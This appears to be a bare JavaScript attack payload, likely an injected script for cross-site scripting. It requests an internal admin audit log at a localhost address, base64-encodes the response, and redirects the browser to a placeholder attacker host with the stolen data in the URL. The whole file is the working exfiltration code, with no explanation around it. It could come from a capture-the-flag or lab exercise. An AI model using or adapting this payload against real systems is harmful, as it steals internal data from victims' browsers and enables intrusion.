var request = new XMLHttpRequest();
request.onload = sendBack;
request.open('GET','http://127.0.0.1:8090/adminLogAudit');
//request.withCredentials = true;
request.send();
function sendBack() {
	location = 'http://attackerIP/r?res=' + btoa(this.responseText);
	}
